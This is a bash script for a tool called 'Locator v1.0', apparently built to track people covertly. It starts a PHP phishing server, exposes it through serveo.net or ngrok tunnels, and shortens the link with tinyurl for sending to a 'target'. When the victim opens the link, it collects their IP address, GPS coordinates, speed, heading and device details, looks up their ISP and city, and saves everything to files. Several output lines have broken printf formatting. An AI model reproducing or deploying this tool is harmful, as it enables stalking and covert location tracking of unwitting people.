#!/bin/bash
# Locator v1.0
# Coded by: xGabinator
# Github: https://github.com/xGabinator/Locator

trap 'printf "\n";stop;exit 1' 2


dependencies() {

command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }



command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }

}


stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
pkill -f -2 ssh > /dev/null 2>&1
killall ssh > /dev/null 2>&1
fi
if [[ -e sendlink ]]; then
rm -rf sendlink
fi



}




catch_cred() {

longitude=$(grep -o 'Longitude:.*' server/geolocate.txt | cut -d " " -f2 | tr -d ' ')
IFS=$'\n'
latitude=$(grep -o 'Latitude:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
altitude=$(grep -o 'Altitude:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
accuracy=$(grep -o 'Accuracy:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
hardware=$(grep -o 'Cores:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
speed=$(grep -o 'Speed:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
platform=$(grep -o 'Platform:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
heading=$(grep -o 'Heading:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
memory=$(grep -o 'Memory:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
useragent=$(grep -o 'User-Agent:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
height=$(grep -o 'Screen Height:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
width=$(grep -o 'Screen Width:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
printf "\n"
printf "Geolocation:"
printf "\n"
printf "\Latitude: " $latitude
printf "Longitude: " $longitude
printf "Altitude: " $altitude
printf "Speed: " $speed
printf "Heading: " $heading
printf "Accuracy: " $accuracy
printf "https://www.google.com/maps/place/" $latitude $longitude
printf "\n"
printf "Device Info:\n"
printf "\n"
printf "Platform: " $platform
printf "Cores: " $hardware
printf "User-Agent: " $useragent
printf "Memory: " $memory
printf "Resolution: " $height $width
cat server/geolocate.txt >> server/saved.geolocate.txt
printf "Saved: server/saved.geolocate.txt"
killall -2 php > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
killall ssh > /dev/null 2>&1
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
exit 1

}

getcredentials() {
printf "Waiting Geolocation ..."
while [ true ]; do


if [[ -e "server/geolocate.txt" ]]; then
printf "Geolocation Found!"
catch_cred

fi
sleep 0.5
if [[ -e "server/error.txt" ]]; then
printf "Error on Geolocation!"
checkerror=$(grep -o 'Error:.*' server/error.txt | cut -d " " -f2 | tr -d ' ' )
if [[ $checkerror == 1 ]]; then
printf "User Denied Geolocation ..."

rm -rf server/error.txt
getcredentials
elif [[ $checkerror == 2 ]]; then
printf "Geolocation Unavailable ..."

rm -rf server/error.txt
getcredentials
elif [[ $checkerror == 3 ]]; then
printf "Time Out ..."

rm -rf server/error.txt
getcredentials
elif [[ $checkerror == 4 ]]; then
printf "Unknow Error ..."

rm -rf server/error.txt
getcredentials
else
printf "Error reading file error.txt..."
exit 1
fi
fi
sleep 0.5



done


}

catch_ip() {
touch server/saved.geolocate.txt
ip=$(grep -a 'IP:' server/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
ua=$(grep 'User-Agent:' server/ip.txt | cut -d '"' -f2)
printf "Target IP: " $ip
printf "User-Agent: " $ua
printf "Saved: server/saved.ip.txt"
cat server/ip.txt >> server/saved.ip.txt


if [[ -e iptracker.log ]]; then
rm -rf iptracker.log
fi

IFS='\n'
iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
IFS=$'\n'
continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
printf "\n"
hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
if [[ $hostnameip != "" ]]; then
printf "[*] Hostname: " $hostnameip
fi
##

reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
if [[ $reverse_dns != "" ]]; then
printf "[*] Reverse DNS: " $reverse_dns
fi
##


if [[ $continent != "" ]]; then
printf "[*] IP Continent: " $continent
fi
##

country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
if [[ $country != "" ]]; then
printf "[*] IP Country: " $country
fi
##

state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
if [[ $state != "" ]]; then
printf "[*] State: " $state
fi
##
city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $city != "" ]]; then
printf "[*] City Location: " $city
fi
##

isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $isp != "" ]]; then
printf "[*] ISP: " $isp
fi
##

as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $as_number != "" ]]; then
printf "AS Number: " $as_number
fi
##

ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $ip_speed != "" ]]; then
printf "[*] IP Address Speed: " $ip_speed
fi
##
ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $ip_currency != "" ]]; then
printf "IP Currency: " $ip_currency
fi
##
printf "\n"
rm -rf iptracker.log

getcredentials
}

##
serverx() {
printf "Starting php server..."
php -t "server/" -S 127.0.0.1:$port > /dev/null 2>&1 &
sleep 2
printf "Starting server..."
command -v ssh > /dev/null 2>&1 || { echo >&2 "I require SSH but it's not installed. Install it. Aborting."; exit 1; }
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > sendlink ' &
printf "\n"
sleep 4 # &
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf "\n"
printf 'Send the direct link to target: ' $send_link
send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link)
printf 'Or using tinyurl: ' $send_ip
printf "\n"
checkfound


}

startx() {
if [[ -e server/ip.txt ]]; then
rm -rf server/ip.txt

fi
if [[ -e server/geolocate.txt ]]; then
rm -rf server/geolocate.txt

fi

if [[ -e server/error.txt ]]; then
rm -rf server/error.txt

fi

default_port="55333"
printf 'Choose a Port (Default: 55333)' $default_port
read port
port="${port:-${default_port}}"
serverx

}


##

start() {
if [[ -e server/ip.txt ]]; then
rm -rf server/ip.txt

fi
if [[ -e server/geolocate.txt ]]; then
rm -rf server/geolocate.txt

fi

if [[ -e server/error.txt ]]; then
rm -rf server/error.txt

fi
if [[ -e ngrok ]]; then
echo ""
else

printf "Downloading Ngrok..."
printf "\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "Download error... Termux, run: pkg install wget"
printf "\n"
exit 1
fi



else
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
if [[ -e ngrok-stable-linux-386.zip ]]; then
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "[!] Download error..."
exit 1
fi
fi
fi

printf "Starting php server...\n"
php -t "server/" -S 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 2
printf "Starting ngrok server...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "Send this link to the Target: " $link
checkfound
}

start1() {
printf "\n"
printf "Serveo.net (SSH Tunelling, Best!)"
printf "Ngrok"
default_option_server="1"
read -p $'Choose a Port Forwarding option: ' option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server == 1 || $option_server == 01 ]]; then
startx

elif [[ $option_server == 2 || $option_server == 02 ]]; then
start
else
printf "[!] Invalid option!"
sleep 1
clear
start1
fi

}
checkfound() {

printf "\n"
printf "Waiting target open the link ..."
printf "\n"
while [ true ]; do


if [[ -e "server/ip.txt" ]]; then
printf "\n IP Found!"
printf "\n"
catch_ip

fi
sleep 1
done

}

banner() {

printf " ___       ________  ________  ________  _________  ________  ________          "
printf "|\  \     |\   __  \|\   ____\|\   __  \|\___   ___\\   __  \|\   __  \         "
printf "\ \  \    \ \  \|\  \ \  \___|\ \  \|\  \|___ \  \_\ \  \|\  \ \  \|\  \        "
printf " \ \  \    \ \  \\\  \ \  \    \ \   __  \   \ \  \ \ \  \\\  \ \   _  _\       "
printf "  \ \  \____\ \  \\\  \ \  \____\ \  \ \  \   \ \  \ \ \  \\\  \ \  \\  \       "
printf "   \ \_______\ \_______\ \_______\ \__\ \__\   \ \__\ \ \_______\ \__\\ _\      "
printf "    \|_______|\|_______|\|_______|\|__|\|__|    \|__|  \|_______|\|__|\|__| v1.0"
printf "\n"
printf "Coded by: xGabinator"

}
banner
dependencies
start1
